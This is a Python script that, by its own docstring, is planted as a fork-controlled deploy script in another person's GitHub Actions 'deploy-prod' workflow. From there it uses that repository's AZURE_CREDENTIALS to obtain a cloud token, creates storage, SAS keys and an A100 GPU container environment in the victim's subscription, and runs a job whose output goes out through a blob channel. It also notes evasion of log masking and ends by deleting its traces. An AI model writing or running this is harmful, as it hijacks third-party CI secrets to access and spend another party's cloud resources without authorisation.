#!/usr/bin/env python3
"""C211-I121369: mslearn subscription 790067ff - ONE Container Apps Consumption-GPU-NC24-A100
workload-profile probe with nvidia-smi device proof, independent ARM readback and teardown.

Runs as the fork-controlled src/deploy_to_online_endpoint.py under the
christiansegercrantz/mslearn-mlops 'deploy-prod' issue_comment workflow
(environment prod, AZURE_CREDENTIALS -> ARM token for subscription 790067ff, RG chriso-sandbox-rg).

Proven predecessors:
  * x121089: workload-profile catalogue lists Consumption-GPU-NC24-A100
    (category Consumption-GPU-A100, cores 24, memoryGiB 220, gpus 1).
  * x121255/x121266: the SAME subscription ran ONE nonce job on the
    Consumption-GPU-NC8as-T4 profile and printed Tesla T4 GPU-301ec706-961a-1a2c-873a-4f06e59b2a4e;
    stdout captured over a private account-SAS blob channel (the only capture surface that
    works: the container-logs ARM endpoints 401 for this identity).

This probe (NEW SKU, not a retest):
  1) reads the workload-profile catalogue per candidate region (region support matrix),
  2) creates ONE nonce managed environment with the Consumption-GPU-NC24-A100 profile,
     recording every verbatim refusal (unsupported profile / region / quota),
  3) submits ONE nonce Container Apps job (1 replica) running nvidia-smi -L and
     --query-gpu=name,uuid,memory.total, with stdout uploaded to our own account-SAS blob,
     polls the execution (properties.status) to terminal and re-GETs the blob,
  4) takes an independent ARM execution+environment GET readback,
  5) deletes job -> environment -> storage and proves absence (404 + list NO_RESULTS).

stdout is a flat tag|k=v format (no JSON braces: this repo's logs mask brace runs because
AZURE_CREDENTIALS contains JSON). Full bodies are base64. stdlib only.
"""
import base64
import hashlib
import hmac
import json
import re
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request

ARM = "https://management.azure.com"
RG = "chriso-sandbox-rg"
TAG = "C211_I121369"
NONCE = "x121369a100"
DEADLINE = 3000
T0 = time.time()

APP_VER = "2026-07-01"
APP_VER_LP = "2024-02-02-preview"
STG_VER = "2023-01-01"
NET_VER = "2023-09-01"
IMAGE = "mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest"
PROFILE = "Consumption-GPU-NC24-A100"
SUB_EXPECT = "790067ff-3e39-4632-ad1a-d65702d42c88"

ENV_NEW = "c211-i121369-cae"
JOB_NEW = "c211-i121369-job"
REGIONS = ["eastus", "westeurope", "westus2", "southcentralus"]
MAX_REGION_ATTEMPTS = 2
SA_NAME = ("c211i121369" + hashlib.sha256(NONCE.encode()).hexdigest()[:8]).lower()[:24]

UUID_RE = re.compile(r"GPU-[0-9a-fA-F-]{16,}")


def clean(v):
    s = str(v)
    for ch in ("|", "\n", "\r", "\t"):
        s = s.replace(ch, " ")
    return s


def emit(step, **kv):
    parts = [TAG, "step=" + clean(step)]
    for k, v in kv.items():
        parts.append("%s=%s" % (clean(k), clean(v)))
    print("|".join(parts), flush=True)


def b64(s):
    if not s:
        return ""
    return base64.b64encode(s.encode("utf-8", "replace")).decode()


def left():
    return DEADLINE - (time.time() - T0)


def run(cmd, timeout=300):
    t = time.time()
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {"rc": p.returncode, "out": p.stdout or "", "err": p.stderr or "",
                "secs": round(time.time() - t, 1)}
    except Exception as e:  # noqa: BLE001
        return {"rc": 1, "out": "", "err": str(e), "secs": round(time.time() - t, 1)}


def arm(tok, url, method="GET", body=None, timeout=90):
    data = json.dumps(body).encode() if body is not None else None
    hdrs = {"Authorization": "Bearer " + tok}
    if data is not None:
        hdrs["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, method=method, headers=hdrs)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace") or "{}"
            try:
                return r.status, json.loads(raw)
            except Exception:  # noqa: BLE001
                return r.status, {"raw": raw[:2000]}
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace") or ""
        try:
            return e.code, json.loads(raw)
        except Exception:  # noqa: BLE001
            return e.code, {"raw": raw[:2000]}


def httptext(url, method="GET", body=None, headers=None, timeout=60):
    data = body if isinstance(body, bytes) else (body.encode() if body is not None else None)
    hdrs = dict(headers or {})
    req = urllib.request.Request(url, data=data, method=method, headers=hdrs)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read() or b""
    except Exception as e:  # noqa: BLE001
        return -1, str(e).encode()


def err_of(st, body):
    if isinstance(body, dict):
        e = body.get("error")
        if isinstance(e, dict):
            return {"http": st, "code": e.get("code"), "message": clean(e.get("message", ""))[:400]}
        if "raw" in body:
            return {"http": st, "raw": clean(body["raw"])[:300]}
    return {"http": st}


def errk(st, body):
    d = err_of(st, body)
    return {k: v for k, v in d.items() if k != "http"}


def wait_gone(tok, url, label, tries=24, sleep_s=10):
    for i in range(tries):
        st, _ = arm(tok, url, timeout=60)
        emit("%s-absent-poll" % label, i=i, http=st)
        if st == 404:
            return True
        time.sleep(sleep_s)
    return False


def sa_sas(acct, key_b64, services="b", rt="co", perm="rwdlc", hours=3):
    # byte-identical to the proven i121164/i121255 account-SAS implementation (works on this sub)
    st = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() - 300))
    se = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() + hours * 3600))
    sv = "2022-11-02"
    sts = "\n".join([acct, perm, services, rt, st, se, "", "https", sv, ""]) + "\n"
    sig = base64.b64encode(hmac.new(base64.b64decode(key_b64), sts.encode(),
                                    hashlib.sha256).digest()).decode()
    q = urllib.parse.urlencode({"sv": sv, "ss": services, "srt": rt, "sp": perm,
                                "st": st, "se": se, "spr": "https", "sig": sig})
    return q, se


def main():
    sid = None
    r = run(["az", "account", "show", "-o", "json"], timeout=120)
    try:
        acc = json.loads(r["out"])
        sid = acc.get("id")
        emit("session", sub_name=acc.get("name"), sub_id=sid, state=acc.get("state"),
             user_type=(acc.get("user") or {}).get("type"), tenant=acc.get("tenantId"),
             expect_match=(sid == SUB_EXPECT))
    except Exception as e:  # noqa: BLE001
        emit("fatal", why="no_session", err=str(e), raw=r["out"][:200])
        return
    r = run(["az", "account", "get-access-token", "--resource", ARM, "--output", "json"], timeout=120)
    tok = None
    try:
        tok = json.loads(r["out"]).get("accessToken")
    except Exception:  # noqa: BLE001
        pass
    emit("arm-token", got=bool(tok), len=len(tok or ""))
    if not sid or not tok:
        emit("DONE", phase="fatal", verdict="NO_ARM_TOKEN", elapsed_s=int(time.time() - T0))
        return

    # ---------- 1) providers + inventory ----------
    prov = {}
    for ns in ("Microsoft.Storage", "Microsoft.App", "Microsoft.Network"):
        st, b = arm(tok, f"{ARM}/subscriptions/{sid}/providers/{ns}?api-version=2021-04-01")
        state = (b.get("registrationState") if isinstance(b, dict) else None)
        prov[ns] = state
        emit("provider", ns=ns, http=st, registrationState=state)
    st, rl = arm(tok, f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/resources?api-version=2021-04-01",
                 timeout=120)
    allres = (rl.get("value") or []) if isinstance(rl, dict) else []
    mine = [{"name": x.get("name"), "type": x.get("type")} for x in allres
            if str(x.get("name", "")).lower().startswith("c211")]
    emit("rg-inventory", http=st, total=len(allres), c211_n=len(mine),
         c211_names=";".join("%s:%s" % (x["name"], x["type"]) for x in mine))

    # ---------- 2) region support matrix for the A100 workload profile ----------
    region_support = {}
    for reg in REGIONS:
        got = []
        for ver in (APP_VER_LP, "2023-05-01", APP_VER):
            st, b = arm(tok, f"{ARM}/subscriptions/{sid}/providers/Microsoft.App/locations/"
                             f"{reg}/availableWorkloadProfiles?api-version={ver}", timeout=60)
            if isinstance(b, dict) and (b.get("value") is not None):
                for v in b.get("value") or []:
                    got.append("%s:%s" % (v.get("name"), v.get("workloadProfileType")))
                emit("region-profile-list", region=reg, ver=ver, http=st, n=len(b.get("value") or []),
                     a100=("yes" if any("A100" in x for x in got) else "no"),
                     types=";".join(got)[:600])
                break
            else:
                emit("region-profile-list", region=reg, ver=ver, http=st, **errk(st, b))
        region_support[reg] = got
    emit("region-support", matrix=";".join(
        "%s=%s" % (r, ("A100" if any("A100" in x for x in v) else "noA100")) for r, v in region_support.items()))

    # ---------- 3) storage account + SAS capture channel ----------
    sas = None
    saurl = (f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers/"
             f"Microsoft.Storage/storageAccounts/{SA_NAME}?api-version={STG_VER}")
    if prov.get("Microsoft.Storage") != "Registered":
        st, b = arm(tok, f"{ARM}/subscriptions/{sid}/providers/Microsoft.Storage/"
                         f"register?api-version=2021-04-01", method="POST", timeout=180)
        emit("storage-register", **err_of(st, b))
        time.sleep(6)
    sabody = {"location": "eastus", "sku": {"name": "Standard_LRS"}, "kind": "StorageV2",
              "tags": {"c211": "i121369", "nonce": NONCE},
              "properties": {"allowBlobPublicAccess": False, "minimumTlsVersion": "TLS1_2",
                             "supportsHttpsTrafficOnly": True,
                             "networkAcls": {"bypass": "AzureServices", "defaultAction": "Allow"}}}
    st, b = arm(tok, saurl, method="PUT", body=sabody, timeout=240)
    emit("sa-create", name=SA_NAME, **err_of(st, b))
    if st in (200, 201, 202):
        for i in range(24):
            stp, bp = arm(tok, saurl, timeout=60)
            ps = ((bp.get("properties") or {}) if isinstance(bp, dict) else {}).get("provisioningState")
            emit("sa-poll", i=i, http=stp, state=ps)
            if ps == "Succeeded":
                break
            time.sleep(8)
        st, kb = arm(tok, f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers/"
                          f"Microsoft.Storage/storageAccounts/{SA_NAME}/listKeys?api-version={STG_VER}",
                     method="POST", body={}, timeout=90)
        key = None
        try:
            key = (kb.get("keys") or [{}])[0].get("value")
        except Exception:  # noqa: BLE001
            pass
        emit("sa-keys", http=st, got=bool(key))
        if key:
            try:
                q, se = sa_sas(SA_NAME, key)
                base = f"https://{SA_NAME}.blob.core.windows.net"
                stc, bc = httptext(f"{base}/c211?restype=container&{q}", method="PUT")
                emit("sa-container", http=stc, body=b64(bc[:200].decode("utf-8", "replace")))
                if stc in (201, 409):
                    sas = f"{base}/c211/{NONCE}-out.txt?{q}"
                    emit("sa-sas", ok=True, blob=f"{base}/c211/{NONCE}-out.txt", expires=se)
            except Exception as e:  # noqa: BLE001
                emit("sa-sas", ok=False, err=str(e))

    # ---------- 4) environment attempts: ONE nonce env per candidate region ----------
    env_id = None
    envname = ENV_NEW
    used_region = None
    envurl = None
    attempts = 0
    for reg in REGIONS:
        if attempts >= MAX_REGION_ATTEMPTS:
            break
        if left() < 1500:
            emit("env-skip", region=reg, why="budget", left_s=int(left()))
            break
        attempts += 1
        name = ENV_NEW if attempts == 1 else "%s-%s" % (ENV_NEW, reg[:6])
        url = (f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers/Microsoft.App/"
               f"managedEnvironments/{name}?api-version={APP_VER}")
        envbody = {"location": reg, "tags": {"c211": "i121369", "nonce": NONCE},
                   "properties": {"workloadProfiles": [
                       {"name": "Consumption", "workloadProfileType": "Consumption"},
                       {"name": PROFILE, "workloadProfileType": PROFILE}]}}
        st, b = arm(tok, url, method="PUT", body=envbody, timeout=300)
        emit("capp-env-create", attempt=attempts, name=name, profile=PROFILE, region=reg,
             **err_of(st, b))
        if st not in (200, 201):
            continue
        ps = None
        cap = min(1150, max(240, left() - 1200))
        dl = time.time() + cap
        while time.time() < dl:
            stp, bp = arm(tok, url, timeout=60)
            props = (bp.get("properties") or {}) if isinstance(bp, dict) else {}
            ps = props.get("provisioningState")
            wps = ";".join("%s:%s" % (w.get("name"), w.get("workloadProfileType"))
                           for w in (props.get("workloadProfiles") or []))
            emit("capp-env-poll", attempt=attempts, http=stp, state=ps,
                 environmentMode=props.get("environmentMode"), profiles=wps[:400])
            if ps in ("Succeeded", "Failed", "Canceled"):
                break
            time.sleep(25)
        if ps == "Succeeded":
            st, env = arm(tok, url, timeout=60)
            env_id = env.get("id") if isinstance(env, dict) else None
            used_region = reg
            envname = name
            envurl = url
            epp = (env.get("properties") or {}) if isinstance(env, dict) else {}
            emit("env-ready", name=name, region=reg, id_ok=bool(env_id),
                 state=epp.get("provisioningState"),
                 profiles=";".join("%s:%s" % (w.get("name"), w.get("workloadProfileType"))
                                   for w in (epp.get("workloadProfiles") or []))[:500],
                 defaultDomain=epp.get("defaultDomain"))
            break
        # not succeeded: record and delete before the next region attempt
        stf, bf = arm(tok, url, timeout=60)
        fprops = (bf.get("properties") or {}) if isinstance(bf, dict) else {}
        emit("env-not-ready", name=name, region=reg, state=ps,
             last_error=clean(json.dumps(fprops.get("lastDeploymentErrors") or fprops.get("errors") or ""))[:400]
             if isinstance(fprops, dict) else "")
        std, bd = arm(tok, url, method="DELETE", timeout=300)
        emit("unready-env-delete", name=name, **err_of(std, bd))
        wait_gone(tok, url, "unready-env", tries=12, sleep_s=10)

    if not env_id:
        emit("DONE", phase="capp", verdict="A100_ENV_NOT_AVAILABLE", elapsed_s=int(time.time() - T0))
        if sas is not None:
            st, b = arm(tok, saurl, method="DELETE", timeout=240)
            emit("sa-delete", name=SA_NAME, **err_of(st, b))
        st, rl = arm(tok, f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/resources?api-version=2021-04-01",
                     timeout=120)
        allres = (rl.get("value") or []) if isinstance(rl, dict) else []
        mine = [x.get("name") for x in allres if str(x.get("name", "")).lower().startswith("c211")]
        emit("rg-final", http=st, total=len(allres),
             c211_left=("NO_RESULTS" if not mine else ";".join(mine)))
        return

    # ---------- 5) ONE nonce job execution on the A100 profile ----------
    inner = ('echo C211-START; hostname; date -u; '
             'for p in /usr/local/nvidia/bin/nvidia-smi /usr/bin/nvidia-smi /bin/nvidia-smi; do '
             'if [ -x "$p" ]; then echo FOUND=$p; "$p" -L; echo ---SMI-Q---; '
             '"$p" --query-gpu=name,uuid,memory.total --format=csv,noheader; fi; done; '
             'command -v nvidia-smi >/dev/null 2>&1 && nvidia-smi -L; '
             'echo ---DEVS---; ls -l /dev/nvidia* 2>/dev/null; echo C211-END')
    cmd = f"OUT=/tmp/c211.txt; {{ {inner}; }} > $OUT 2>&1; cat $OUT; "
    if sas:
        up = ("if command -v curl >/dev/null 2>&1; then "
              f"curl -sS -X PUT '{sas}' -H 'x-ms-blob-type: BlockBlob' "
              "-H 'x-ms-version: 2022-11-02' -H 'Content-Type: text/plain' "
              "--data-binary @$OUT; echo C211_UPLOAD_CURL_RC=$?; else "
              "python3 -c \"import urllib.request;d=open('/tmp/c211.txt','rb').read();"
              f"r=urllib.request.Request('{sas}',data=d,method='PUT',"
              "headers={'x-ms-blob-type':'BlockBlob','x-ms-version':'2022-11-02',"
              "'Content-Type':'text/plain'});print('C211_UPLOAD_PY',urllib.request.urlopen(r,timeout=30).status)\"; fi")
        cmd += up + "; "
    cmd += "echo C211_UPLOAD_DONE; sleep 20"
    joburl = (f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/providers/Microsoft.App/jobs/"
              f"{JOB_NEW}?api-version={APP_VER}")
    jobbody = {"location": used_region, "tags": {"c211": "i121369", "nonce": NONCE},
               "properties": {"environmentId": env_id, "workloadProfileName": PROFILE,
                              "configuration": {"triggerType": "Manual",
                                                "replicaRetryLimit": 0,
                                                "replicaTimeout": 1500,
                                                "manualTriggerConfig": {
                                                    "replicaCompletionCount": 1,
                                                    "parallelism": 1}},
                              "template": {"containers": [{
                                  "name": "gpu", "image": IMAGE,
                                  "command": ["/bin/bash", "-c", cmd],
                                  "resources": {"cpu": 4, "memory": "16Gi"}}]}}}
    st, b = arm(tok, joburl, method="PUT", body=jobbody, timeout=180)
    emit("capp-job-create", name=JOB_NEW, profile=PROFILE, region=used_region, **err_of(st, b))
    job_created = st in (200, 201)
    text = ""
    execname = None
    if job_created:
        baseurl = joburl.split("?")[0]
        st, b = arm(tok, f"{baseurl}/start?api-version={APP_VER}", method="POST", body={},
                    timeout=120)
        execname = (b.get("name") if isinstance(b, dict) else None)
        emit("capp-job-start", http=st, execname=execname,
             **({} if st in (200, 201, 202) else errk(st, b)))
        if execname:
            exurl = f"{baseurl}/executions/{execname}?api-version={APP_VER}"
            cap = min(1250, max(360, left() - 620))
            dl = time.time() + cap
            poll_i = 0
            terminal_seen = False
            last_status = None
            while time.time() < dl:
                stp, bp = arm(tok, exurl, timeout=60)
                p = (bp.get("properties") or {}) if isinstance(bp, dict) else {}
                status = p.get("status")
                last_status = status
                blobd = None
                if sas:
                    sb, bb = httptext(sas, timeout=30)
                    if sb == 200 and bb:
                        blobd = bb.decode("utf-8", "replace")
                logs = {}
                if poll_i % 3 == 0 or (status in ("Succeeded", "Failed", "Canceled")):
                    for ver in (APP_VER_LP, "2023-05-01", APP_VER):
                        sl, bl = httptext(
                            f"{baseurl}/executions/{execname}/containers/gpu/logs"
                            f"?api-version={ver}", method="POST", timeout=30)
                        logs["P" + ver] = "%s:%s" % (sl, len(bl or b""))
                        if sl == 200 and bl and len(bl) > 2:
                            txt = bl.decode("utf-8", "replace")
                            if UUID_RE.search(txt):
                                blobd = txt
                    sl3, bl3 = httptext(f"{baseurl}/getlogs?api-version={APP_VER}",
                                        method="POST", timeout=30)
                    logs["getlogs"] = "%s:%s" % (sl3, len(bl3 or b""))
                emit("capp-exec-poll", i=poll_i, http=stp, status=status,
                     reason=p.get("reason"), startTime=p.get("startTime"),
                     endTime=p.get("endTime"), blob_got=(blobd is not None),
                     blob_len=len(blobd or ""),
                     logs=";".join("%s=%s" % (k, v) for k, v in logs.items()))
                if blobd:
                    text = blobd
                    if "C211-END" in blobd:
                        break
                if status in ("Succeeded", "Failed", "Canceled"):
                    if terminal_seen:
                        break
                    terminal_seen = True
                    time.sleep(10)
                poll_i += 1
                time.sleep(18)
            emit("capp-capture", len=len(text or ""),
                 has_uuid=bool(UUID_RE.search(text or "")),
                 uuid_lines=";".join(ln for ln in (text or "").splitlines()
                                     if "GPU-" in ln)[:800],
                 text_b64=b64((text or "")[:6000]))
            # ---------- 6) independent ARM readback of execution + environment ----------
            st, eb = arm(tok, exurl, timeout=60)
            p = (eb.get("properties") or {}) if isinstance(eb, dict) else {}
            emit("readback-execution", http=st, name=execname, status=p.get("status"),
                 reason=p.get("reason"), startTime=p.get("startTime"), endTime=p.get("endTime"),
                 provisioningState=p.get("provisioningState"))
            st, ev = arm(tok, envurl, timeout=60)
            ep = (ev.get("properties") or {}) if isinstance(ev, dict) else {}
            emit("readback-env", http=st, name=envname, region=used_region,
                 provisioningState=ep.get("provisioningState"),
                 profiles=";".join("%s:%s" % (w.get("name"), w.get("workloadProfileType"))
                                   for w in (ep.get("workloadProfiles") or []))[:500])

    # ---------- 7) teardown: job -> env -> storage ----------
    st, b = arm(tok, joburl, method="DELETE", timeout=240)
    emit("job-delete", name=JOB_NEW, **err_of(st, b))
    wait_gone(tok, joburl, "job", tries=24, sleep_s=10)
    st, b = arm(tok, envurl, method="DELETE", timeout=300)
    emit("env-delete", name=envname, **err_of(st, b))
    wait_gone(tok, envurl, "env", tries=30, sleep_s=12)
    if sas is not None:
        st, b = arm(tok, saurl, method="DELETE", timeout=240)
        emit("sa-delete", name=SA_NAME, **err_of(st, b))
        wait_gone(tok, saurl, "sa", tries=20, sleep_s=8)

    # ---------- 8) absence proof ----------
    st, rl = arm(tok, f"{ARM}/subscriptions/{sid}/resourceGroups/{RG}/resources?api-version=2021-04-01",
                 timeout=120)
    allres = (rl.get("value") or []) if isinstance(rl, dict) else []
    mine = [{"name": x.get("name"), "type": x.get("type")} for x in allres
            if str(x.get("name", "")).lower().startswith("c211")]
    emit("rg-final", http=st, total=len(allres),
         c211_left=("NO_RESULTS" if not mine else ";".join("%s:%s" % (x["name"], x["type"])
                                                          for x in mine)))
    for label, path, ver in (
            ("jobs", f"/subscriptions/{sid}/providers/Microsoft.App/jobs", APP_VER),
            ("envs", f"/subscriptions/{sid}/providers/Microsoft.App/managedEnvironments", APP_VER)):
        st, lst = arm(tok, f"{ARM}{path}?api-version={ver}", timeout=120)
        names = [x.get("name") for x in ((lst.get("value") or []) if isinstance(lst, dict) else [])
                 if str(x.get("name", "")).lower().startswith("c211")]
        emit("list-" + label, http=st,
             n_total=len(((lst.get("value") or []) if isinstance(lst, dict) else [])),
             c211=("NO_RESULTS" if not names else ";".join(names)))
    for label, u in (("env", envurl), ("job", joburl)):
        st, _ = arm(tok, u, timeout=60)
        emit("final-get-" + label, http=st)
    emit("DONE", phase="capp", elapsed_s=int(time.time() - T0))


if __name__ == "__main__":
    main()
